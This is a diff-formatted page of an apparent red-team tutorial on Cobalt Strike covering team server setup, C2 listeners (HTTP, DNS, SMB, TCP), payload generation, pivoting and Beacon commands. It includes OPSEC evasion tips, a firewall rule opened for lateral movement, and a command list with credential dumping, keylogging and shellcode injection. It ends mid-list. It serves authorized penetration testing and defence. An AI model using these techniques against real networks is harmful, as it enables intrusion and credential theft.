+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<p><strong>Cobalt Strike</strong> was one of the first public red team command and control frameworks.</p>
+<p>Red Teamers and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs.</p>
+<p>Cobalt Strike is split into client and a server components. </p>
+<p>Check more info in the official documentation.</p>
+<ul>
+<li><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm</a></li>
+</ul>
+<h1 id="installation">Installation<a class="headerlink" href="#installation" title="Permanent link">&para;</a></h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo apt-add-repository &#39;deb http://security.debian.org/debian-security stretch/updates main&#39;
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>sudo apt-get update
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>sudo apt-get install openjdk-11-jdk
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>sudo apt install proxychains socat
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>sudo update-alternatives --config java #Select openjdk-11
+</span></code></pre></div>
+<h1 id="starting-the-team-server">Starting the Team Server<a class="headerlink" href="#starting-the-team-server" title="Permanent link">&para;</a></h1>
+<p>The server, referred to as the team server, is the controller for the Beacon payload and the host for Cobalt Strike’s social engineering features. The team server also stores data collected by Cobalt Strike and it manages logging.</p>
+<p>The server run on a <strong>supported Linux</strong> systems. To start the team server, execute the following command:</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>./teamserver &lt;IP&gt; &lt;Password&gt; &lt;Malleable C2 Profile&gt;
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>[*] Generating X509 certificate and keystore (for SSL)
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>[+] Team server is up on 0.0.0.0:50050
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>[*] SHA256 hash of SSL cert is: eadd46ff4f74d582290ce1755513ddfc0ffd736f90bed5d8d662ee113faccb43
+</span></code></pre></div>
+Once started we can launch the client and connect with the password used.</p>
+<p><img alt="" src="../images/cobaltstrike-login.png" /></p>
+<p>Verify the server's fingerprint before connecting.</p>
+<blockquote>
+<p><strong>OPSEC Note:</strong> The team server allows multiple clients to connect at the same time. If remote team members needs to connect, you shouldn't expose port 50050 directly to internet. Use a secure remote access solution such as SSH or VPN.</p>
+</blockquote>
+<h2 id="running-as-a-service">Running as a Service<a class="headerlink" href="#running-as-a-service" title="Permanent link">&para;</a></h2>
+<p>Running the team server as a service allows us to start it automatically when the server starts up.</p>
+<p>First we need to create the following file <code>/etc/systemd/system/teamserver.service</code>:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>[Unit]
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Description=Cobalt Strike Team Server
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>After=network.target
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>StartLimitIntervalSec=0
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>[Service]
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>Type=simple
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>Restart=always
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>RestartSec=1
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>User=root
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>WorkingDirectory=/home/user/cobaltstrike
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>ExecStart=/home/user/cobaltstrike/teamserver 10.10.10.10 password c2-profiles/normal/webbug.profile
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>[Install]
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>WantedBy=multi-user.target
+</span></code></pre></div>
+<p>Next, reload the systemd manager and check run teh service.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo systemctl daemon-reload
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>sudo systemctl start teamserver.service
+</span></code></pre></div>
+<p>Finally, the server should start on boot.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>sudo systemctl enable teamserver.service
+</span></code></pre></div>
+<h1 id="listeners">Listeners<a class="headerlink" href="#listeners" title="Permanent link">&para;</a></h1>
+<p>A listener is a host/port/protocol combination that listens for inconming communication from a beacon.</p>
+<p>There are two types:</p>
+<ul>
+<li>
+<p><strong>Egress</strong>: Allow beacons to communicate outside of the target network to our team server.  The default egreess listener types are HTTP/S and DNS. These communications can be personalized such as bodies, headers, cookies, etc with the Malleable C2 Profile.</p>
+</li>
+<li>
+<p><strong>Peer-to-peer</strong>: Allow beacons to chain their communications together over TCP or SMB. These are particularly useful in cases where a machine that you compromise can not reach the team server directly.</p>
+</li>
+</ul>
+<p>In order to create a listener go to <code>Cobalt Strike -&gt; Listeners</code> and click the button <code>Add</code>.</p>
+<p><img alt="" src="../images/cobaltstrike-listener.png" /></p>
+<h2 id="egress-listeners">Egress Listeners<a class="headerlink" href="#egress-listeners" title="Permanent link">&para;</a></h2>
+<h3 id="https">HTTP/S<a class="headerlink" href="#https" title="Permanent link">&para;</a></h3>
+<p>The HTTP listener allows beacon to send and receive C2 messages over HTTP GET and POST requests. </p>
+<h3 id="dns">DNS<a class="headerlink" href="#dns" title="Permanent link">&para;</a></h3>
+<p>The DNS listener allows Beacon to send and receive C2 messages over several Lookup/Response types including A,AAAA and TXT.</p>
+<p>TXT are used by default because they can hold the most amount of data. This requires to create one ore more DNS records for adomain that the team server will be authorative for.</p>
+<p>Above an example:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;"><strong>Name</strong></th>
+<th style="text-align: center;"><strong>Type</strong></th>
+<th style="text-align: center;"><strong>Data</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">@</td>
+<td style="text-align: center;">A</td>
+<td style="text-align: center;">10.10.10.10</td>
+</tr>
+<tr>
+<td style="text-align: center;">ns1</td>
+<td style="text-align: center;">A</td>
+<td style="text-align: center;">10.10.10.10</td>
+</tr>
+<tr>
+<td style="text-align: center;">pics</td>
+<td style="text-align: center;">NS</td>
+<td style="text-align: center;">ns1.example.com</td>
+</tr>
+</tbody>
+</table>
+<p>The DNS Beacon can then preform lookup requests, such as <code>&lt;c2data&gt;.pics.example.com</code>, which will be routed over the internet's DNS infrastructure.</p>
+<p>After adding the beacon with the DNS Resolver <code>pics.example.com</code> we can check it:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>$ dig @ns1.example.com test.pics.example.com +short
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>0.0.0.0
+</span></code></pre></div>
+<blockquote>
+<p><strong>OPSEC Alert</strong>: <code>0.0.0.0</code> is the default response, it can be changed in the Malleable C2 Profile.</p>
+</blockquote>
+<h2 id="peer-to-peer-p2p-listeners">Peer-to-Peer (P2P) listeners<a class="headerlink" href="#peer-to-peer-p2p-listeners" title="Permanent link">&para;</a></h2>
+<p>Peer-to-Peer (P2P) listeners allow Beacons to link their communications together to form a chain. The P2P types in Cobalt Strike are TCP and SMB.</p>
+<p>Link beacon is specially useful when it comes to pivoting, and other situation where you need to spawn an additional beacon payload.</p>
+<blockquote>
+<p><strong>Note</strong>: Help to keep the number of direct outbound connections.</p>
+</blockquote>
+<p>We can create a P2P listener by selecting <code>Beacon SMB</code> or <code>Beacon TCP</code> payload.</p>
+<p>If executing a P2P payload on a target manually, it won't appear in the UI until the <code>link</code> (for SMB Beacons) or <code>connect</code> (for TCP Beacons) command is used. You can also <code>unlink</code> P2P Beacons and then use <code>link</code> again from another Beacon to reorganise the chain.</p>
+<p>Commands such as <code>spawn</code>, <code>spanwas</code>, <code>inject</code> and <code>jump</code> can be use with these payloads.</p>
+<p>There are <strong>no limit</strong> of chain connections but if any of the middle beacons gets disconnected, all the child beacons would be disconnected, but we can <code>link</code> or <code>connect</code> another time.</p>
+<h3 id="beacon-tcp">Beacon TCP<a class="headerlink" href="#beacon-tcp" title="Permanent link">&para;</a></h3>
+<p>While creating the beacon we need to select the port where the target machine will listen and if we want that the target bind to localhost or in all interfaces.</p>
+<p><img alt="" src="../images/cobaltstrike-listener-tcp-chain.png" /></p>
+<p>Once executed the payload for a <code>Beacon TCP</code> a listener will be launched waiting to a connection. In order to spawn the beacon we need to connect to it with the command <code>connect</code>.</p>
+<p>Usage of command <code>connect</code>:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>beacon&gt; help connect
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Use: connect [target]
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>     connect [target] [port]
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>Connect to a TCP Beacon and re-establish control of it. All requests for 
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>connected Beacon will go through this Beacon.
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>Use &#39;unlink&#39; to disconnect from a TCP Beacon.
+</span></code></pre></div>
+So we just need to select the host and the port.</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>beacon&gt; connect 10.10.10.10 4444
+</span></code></pre></div>
+After that a chain on beacons will be created.</p>
+<p><img alt="" src="../images/cobaltstrike-listener-tcp-chain.png" /></p>
+<blockquote>
+<p><strong>Note</strong>: <code>Beacon TCP</code> binding in localhost are recommended to privilege escalations.</p>
+</blockquote>
+<p>It may become necessary to open ports on the Windows Firewall to facilitate lateral movement.</p>
+<ul>
+<li>Add rule:</li>
+</ul>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>netsh advfirewall firewall add rule name=&quot;Allow 4444&quot; dir=in action=allow protocol=TCP localport=4444
+</span></code></pre></div>
+* Delete rule:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>netsh advfirewall firewall delete rule name=&quot;Allow 4444&quot; protocol=TCP localport=4444
+</span></code></pre></div>
+<h3 id="beacon-smb">Beacon SMB<a class="headerlink" href="#beacon-smb" title="Permanent link">&para;</a></h3>
+<p>While creating the beacon we only need to select the pipename that will be used.</p>
+<p><img alt="" src="../images/cobaltstrike-listener-p2p.png" /></p>
+<p>Same as TCP the beacon will listen to a connection. In that case we need to link pipenames with <code>link</code> command.</p>
+<p>We can list them with:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>ls \\.\pipe\
+</span></code></pre></div>
+<p>Usage of <code>link</code> command:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>beacon&gt; help link
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Use: link [target] [pipe]
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>     link [target]
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>Connect to an SMB Beacon and re-establish control of it. All requests for 
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>connected Beacon will go through this Beacon. Specify an explicit [pipe]
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>to link to that pipename. The default pipe from the current profile is
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>used otherwise.
+</span></code></pre></div>
+<p>So we just have to select the target and the chosen pipename in the listener creation.</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>beacon&gt; link 10.10.10.10 \\10.10.10.10\pipe\interprocess_28
+</span></code></pre></div>
+We can also use <code>link</code> command again to reorganize the chain after getting disconnected.</p>
+<blockquote>
+<p><strong>Notes</strong>: When moving laterally between targets, the SMB protocol is used extensively in a Windows environment, so this traffic blends in very well.</p>
+</blockquote>
+<h2 id="pivot-listeners">Pivot Listeners<a class="headerlink" href="#pivot-listeners" title="Permanent link">&para;</a></h2>
+<p>Pivot Listeners are another type of P2P listener that currently only uses <code>TCP</code>. It works in the opposite direction to the regular TCP listener.</p>
+<p>When a beacon is spawned a Beacon payload that uses the TCP listener, that beacon acts as a TCP server and waits for an incoming connection from an existing beacon. Pivot Listeners are not created via the Listeners menu, but are bound to individual beacons.</p>
+<p>This existing beacon will bind a port and listen for incoming connections acting as a TCP Server, and a Beacon payload that uses the pivot listener will act as the TCP client.</p>
+<p>It is very usefull in scenarios where you don't know when the target will actually execute the payload and therefore when you need issue the <code>connect</code> command.</p>
+<p>To start a Pivot Listener right-click on an existing Beacon and select <code>Pivoting-&gt;Listener</code>.</p>
+<p>Once started, your selected port will be bound on that machine.</p>
+<h1 id="payloads">Payloads<a class="headerlink" href="#payloads" title="Permanent link">&para;</a></h1>
+<p>There are two types of payloads:</p>
+<ul>
+<li>
+<p><strong>Staged</strong>: Staged payloads are tiny, when executed the real shellcode is transfered and execute. </p>
+</li>
+<li>
+<p><strong>Stageless</strong>: It contains the whole shellcole which means is bigger than staged payloads.</p>
+</li>
+</ul>
+<blockquote>
+<p><strong>OPSEC Note</strong>: Staged payloads are useful when the delivery method is limited to an amount of data that we can send. However, they tend to have more indicators and is more detectable than stageless payloads.</p>
+</blockquote>
+<p>Cobalt Strike can generate both staged and stageless payloads. On GUI if we see a <code>(S)</code> means that is <em>stageless</em>.</p>
+<h2 id="staged-payloads">Staged Payloads<a class="headerlink" href="#staged-payloads" title="Permanent link">&para;</a></h2>
+<p>Go to <code>Attacks -&gt; Packages -&gt; Windows Executable</code>:</p>
+<p><img alt="" src="../images/cobaltstrike-staged.png" /></p>
+<h2 id="stageless-payloads">Stageless Payloads<a class="headerlink" href="#stageless-payloads" title="Permanent link">&para;</a></h2>
+<p>Go to <code>Attacks -&gt; Packages -&gt; Windows Executable (S)</code>:</p>
+<p><img alt="" src="../images/cobaltstrike-stageless.png" /></p>
+<blockquote>
+<p><strong>OPSEC Note</strong>: The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.</p>
+</blockquote>
+<h1 id="beacon-interaction">Beacon Interaction<a class="headerlink" href="#beacon-interaction" title="Permanent link">&para;</a></h1>
+<p>To interact click on Interact with rigth-click:</p>
+<p><img alt="" src="../images/cobaltstrike-interact.png" /></p>
+<p>To get a list of available commands type <code>help</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>beacon&gt; help
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Beacon Commands
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>===============
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>    Command                   Description
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>    -------                   -----------
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>    argue                     Spoof arguments for matching processes
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>    blockdlls                 Block non-Microsoft DLLs in child processes
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>    browserpivot              Setup a browser pivot session
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>    cancel                    Cancel a download that&#39;s in-progress
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>    cd                        Change directory
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>    checkin                   Call home and post data
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>    chromedump                Recover credentials from Google Chrome
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>    clear                     Clear beacon queue
+</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>    connect                   Connect to a Beacon peer over TCP
+</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>    covertvpn                 Deploy Covert VPN client
+</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a>    cp                        Copy a file
+</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a>    dcsync                    Extract a password hash from a DC
+</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a>    desktop                   View and interact with target&#39;s desktop
+</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a>    dllinject                 Inject a Reflective DLL into a process
+</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a>    dllload                   Load DLL into a process with LoadLibrary()
+</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a>    download                  Download a file
+</span><span id="__span-13-24"><a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a>    downloads                 Lists file downloads in progress
+</span><span id="__span-13-25"><a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a>    drives                    List drives on target
+</span><span id="__span-13-26"><a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a>    elevate                   Spawn a session in an elevated context
+</span><span id="__span-13-27"><a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a>    execute                   Execute a program on target (no output)
+</span><span id="__span-13-28"><a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a>    execute-assembly          Execute a local .NET program in-memory on target
+</span><span id="__span-13-29"><a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a>    exit                      Terminate the beacon session
+</span><span id="__span-13-30"><a id="__codelineno-13-30" name="__codelineno-13-30" href="#__codelineno-13-30"></a>    getprivs                  Enable system privileges on current token
+</span><span id="__span-13-31"><a id="__codelineno-13-31" name="__codelineno-13-31" href="#__codelineno-13-31"></a>    getsystem                 Attempt to get SYSTEM
+</span><span id="__span-13-32"><a id="__codelineno-13-32" name="__codelineno-13-32" href="#__codelineno-13-32"></a>    getuid                    Get User ID
+</span><span id="__span-13-33"><a id="__codelineno-13-33" name="__codelineno-13-33" href="#__codelineno-13-33"></a>    hashdump                  Dump password hashes
+</span><span id="__span-13-34"><a id="__codelineno-13-34" name="__codelineno-13-34" href="#__codelineno-13-34"></a>    help                      Help menu
+</span><span id="__span-13-35"><a id="__codelineno-13-35" name="__codelineno-13-35" href="#__codelineno-13-35"></a>    inject                    Spawn a session in a specific process
+</span><span id="__span-13-36"><a id="__codelineno-13-36" name="__codelineno-13-36" href="#__codelineno-13-36"></a>    inline-execute            Run a Beacon Object File in this session
+</span><span id="__span-13-37"><a id="__codelineno-13-37" name="__codelineno-13-37" href="#__codelineno-13-37"></a>    jobkill                   Kill a long-running post-exploitation task
+</span><span id="__span-13-38"><a id="__codelineno-13-38" name="__codelineno-13-38" href="#__codelineno-13-38"></a>    jobs                      List long-running post-exploitation tasks
+</span><span id="__span-13-39"><a id="__codelineno-13-39" name="__codelineno-13-39" href="#__codelineno-13-39"></a>    jump                      Spawn a session on a remote host
+</span><span id="__span-13-40"><a id="__codelineno-13-40" name="__codelineno-13-40" href="#__codelineno-13-40"></a>    kerberos_ccache_use       Apply kerberos ticket from cache to this session
+</span><span id="__span-13-41"><a id="__codelineno-13-41" name="__codelineno-13-41" href="#__codelineno-13-41"></a>    kerberos_ticket_purge     Purge kerberos tickets from this session
+</span><span id="__span-13-42"><a id="__codelineno-13-42" name="__codelineno-13-42" href="#__codelineno-13-42"></a>    kerberos_ticket_use       Apply kerberos ticket to this session
+</span><span id="__span-13-43"><a id="__codelineno-13-43" name="__codelineno-13-43" href="#__codelineno-13-43"></a>    keylogger                 Start a keystroke logger
+</span><span id="__span-13-44"><a id="__codelineno-13-44" name="__codelineno-13-44" href="#__codelineno-13-44"></a>    kill                      Kill a process
+</span><span id="__span-13-45"><a id="__codelineno-13-45" name="__codelineno-13-45" href="#__codelineno-13-45"></a>    link                      Connect to a Beacon peer over a named pipe
+</span><span id="__span-13-46"><a id="__codelineno-13-46" name="__codelineno-13-46" href="#__codelineno-13-46"></a>    logonpasswords            Dump credentials and hashes with mimikatz
+</span><span id="__span-13-47"><a id="__codelineno-13-47" name="__codelineno-13-47" href="#__codelineno-13-47"></a>    ls                        List files
+</span><span id="__span-13-48"><a id="__codelineno-13-48" name="__codelineno-13-48" href="#__codelineno-13-48"></a>    make_token                Create a token to pass credentials
+</span><span id="__span-13-49"><a id="__codelineno-13-49" name="__codelineno-13-49" href="#__codelineno-13-49"></a>    mimikatz                  Runs a mimikatz command
+</span><span id="__span-13-50"><a id="__codelineno-13-50" name="__codelineno-13-50" href="#__codelineno-13-50"></a>    mkdir                     Make a directory
+</span><span id="__span-13-51"><a id="__codelineno-13-51" name="__codelineno-13-51" href="#__codelineno-13-51"></a>    mode dns                  Use DNS A as data channel (DNS beacon only)
+</span><span id="__span-13-52"><a id="__codelineno-13-52" name="__codelineno-13-52" href="#__codelineno-13-52"></a>    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)
+</span><span id="__span-13-53"><a id="__codelineno-13-53" name="__codelineno-13-53" href="#__codelineno-13-53"></a>    mode dns6                 Use DNS AAAA as data channel (DNS beacon only)
+</span><span id="__span-13-54"><a id="__codelineno-13-54" name="__codelineno-13-54" href="#__codelineno-13-54"></a>    mv                        Move a file
+</span><span id="__span-13-55"><a id="__codelineno-13-55" name="__codelineno-13-55" href="#__codelineno-13-55"></a>    net                       Network and host enumeration tool
+</span><span id="__span-13-56"><a id="__codelineno-13-56" name="__codelineno-13-56" href="#__codelineno-13-56"></a>    note                      Assign a note to this Beacon       
+</span><span id="__span-13-57"><a id="__codelineno-13-57" name="__codelineno-13-57" href="#__codelineno-13-57"></a>    portscan                  Scan a network for open services
+</span><span id="__span-13-58"><a id="__codelineno-13-58" name="__codelineno-13-58" href="#__codelineno-13-58"></a>    powerpick                 Execute a command via Unmanaged PowerShell
+</span><span id="__span-13-59"><a id="__codelineno-13-59" name="__codelineno-13-59" href="#__codelineno-13-59"></a>    powershell                Execute a command via powershell.exe
+</span><span id="__span-13-60"><a id="__codelineno-13-60" name="__codelineno-13-60" href="#__codelineno-13-60"></a>    powershell-import         Import a powershell script
+</span><span id="__span-13-61"><a id="__codelineno-13-61" name="__codelineno-13-61" href="#__codelineno-13-61"></a>    ppid                      Set parent PID for spawned post-ex jobs
+</span><span id="__span-13-62"><a id="__codelineno-13-62" name="__codelineno-13-62" href="#__codelineno-13-62"></a>    printscreen               Take a single screenshot via PrintScr method
+</span><span id="__span-13-63"><a id="__codelineno-13-63" name="__codelineno-13-63" href="#__codelineno-13-63"></a>    ps                        Show process list
+</span><span id="__span-13-64"><a id="__codelineno-13-64" name="__codelineno-13-64" href="#__codelineno-13-64"></a>    psinject                  Execute PowerShell command in specific process
+</span><span id="__span-13-65"><a id="__codelineno-13-65" name="__codelineno-13-65" href="#__codelineno-13-65"></a>    pth                       Pass-the-hash using Mimikatz
+</span><span id="__span-13-66"><a id="__codelineno-13-66" name="__codelineno-13-66" href="#__codelineno-13-66"></a>    pwd                       Print current directory
+</span><span id="__span-13-67"><a id="__codelineno-13-67" name="__codelineno-13-67" href="#__codelineno-13-67"></a>    reg                       Query the registry
+</span><span id="__span-13-68"><a id="__codelineno-13-68" name="__codelineno-13-68" href="#__codelineno-13-68"></a>    remote-exec               Run a command on a remote host
+</span><span id="__span-13-69"><a id="__codelineno-13-69" name="__codelineno-13-69" href="#__codelineno-13-69"></a>    rev2self                  Revert to original token
+</span><span id="__span-13-70"><a id="__codelineno-13-70" name="__codelineno-13-70" href="#__codelineno-13-70"></a>    rm                        Remove a file or folder
+</span><span id="__span-13-71"><a id="__codelineno-13-71" name="__codelineno-13-71" href="#__codelineno-13-71"></a>    rportfwd                  Setup a reverse port forward
+</span><span id="__span-13-72"><a id="__codelineno-13-72" name="__codelineno-13-72" href="#__codelineno-13-72"></a>    rportfwd_local            Setup a reverse port forward via Cobalt Strike client
+</span><span id="__span-13-73"><a id="__codelineno-13-73" name="__codelineno-13-73" href="#__codelineno-13-73"></a>    run                       Execute a program on target (returns output)
+</span><span id="__span-13-74"><a id="__codelineno-13-74" name="__codelineno-13-74" href="#__codelineno-13-74"></a>    runas                     Execute a program as another user
+</span><span id="__span-13-75"><a id="__codelineno-13-75" name="__codelineno-13-75" href="#__codelineno-13-75"></a>    runasadmin                Execute a program in an elevated context
+</span><span id="__span-13-76"><a id="__codelineno-13-76" name="__codelineno-13-76" href="#__codelineno-13-76"></a>    runu                      Execute a program under another PID
+</span><span id="__span-13-77"><a id="__codelineno-13-77" name="__codelineno-13-77" href="#__codelineno-13-77"></a>    screenshot                Take a single screenshot
+</span><span id="__span-13-78"><a id="__codelineno-13-78" name="__codelineno-13-78" href="#__codelineno-13-78"></a>    screenwatch               Take periodic screenshots of desktop
+</span><span id="__span-13-79"><a id="__codelineno-13-79" name="__codelineno-13-79" href="#__codelineno-13-79"></a>    setenv                    Set an environment variable
+</span><span id="__span-13-80"><a id="__codelineno-13-80" name="__codelineno-13-80" href="#__codelineno-13-80"></a>    shell                     Execute a command via cmd.exe
+</span><span id="__span-13-81"><a id="__codelineno-13-81" name="__codelineno-13-81" href="#__codelineno-13-81"></a>    shinject                  Inject shellcode into a process
+</span><span id="__span-13-82"><a id="__codelineno-13-82" name="__codelineno-13-82" href="#__codelineno-13-82"></a>    shspawn                   Spawn process and inject shellcode into it
+</span><span id="__span-13-83"><a id="__codelineno-13-83" name="__codelineno-13-83" href="#__codelineno-13-83"></a>    sleep                     Set beacon sleep time
